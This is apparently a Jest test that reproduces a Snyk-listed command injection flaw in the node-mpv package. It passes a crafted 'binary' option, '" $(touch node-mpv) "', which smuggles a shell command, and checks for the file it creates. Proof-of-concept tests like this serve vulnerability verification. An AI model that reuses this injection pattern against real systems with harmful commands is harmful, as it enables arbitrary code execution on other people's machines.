//https://snyk.io/vuln/SNYK-JS-NODEMPV-564426
test("Command Injection in node-mpv", () => {
  const Root = require("node-mpv");
  const fs = require("fs");
  const path = "./node-mpv";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var options = { binary: '" $(touch node-mpv) "' };
  try {
    var root = new Root(options);
  } catch (error) {}
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
